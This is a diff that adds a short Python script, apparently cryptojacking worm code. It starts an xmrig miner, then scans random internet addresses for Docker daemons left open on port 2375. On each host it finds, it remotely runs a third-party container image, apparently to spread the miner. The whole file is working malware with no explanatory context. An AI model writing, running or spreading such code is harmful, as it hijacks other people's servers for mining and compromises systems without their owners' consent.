@@ -1,0 +1,11 @@
+import socket,subprocess,os,random,struct
+ 
+subprocess.Popen(["/den/xmrig"])
+baglanti = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+baglanti.settimeout(3)
+ 
+while 1:
+    ip = socket.inet_ntoa(struct.pack('>I' , random.randint(1, 0xffffffff)))
+    result = baglanti.connect_ex((ip,2375))
+    if result == 0:
+        os.system("docker -H "+str(ip)+":2375 run -it -d shaylsholmes/myubuntu:3.0")
